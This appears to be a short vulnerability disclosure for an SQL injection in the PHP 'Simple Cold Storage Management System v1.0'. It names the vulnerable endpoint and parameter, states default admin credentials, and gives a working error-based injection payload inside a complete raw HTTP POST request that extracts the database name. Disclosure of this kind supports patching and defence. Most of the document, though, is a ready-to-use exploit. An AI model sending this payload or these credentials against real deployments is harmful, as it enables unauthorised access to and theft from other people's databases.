# Simple Cold Storage Management System v1.0 by oretnom23 has SQL injection

BUG_Author: 0.0

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15088/simple-cold-storage-management-system-using-phpoop-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /csms/classes/Master.php?f=delete_storage

Vulnerability location: /csms/classes/Master.php?f=delete_storage, id

dbname =csms_db,length=7

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id

```sql
POST /csms/classes/Master.php?f=delete_storage HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/csms/admin/?page=bookings
Content-Length: 65
Cookie: PHPSESSID=d8pesjl7i2jtmf2qddggbp7q0b
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/191015354-9c228c4f-95f5-4d25-aba7-44b5fa6f6758.png)
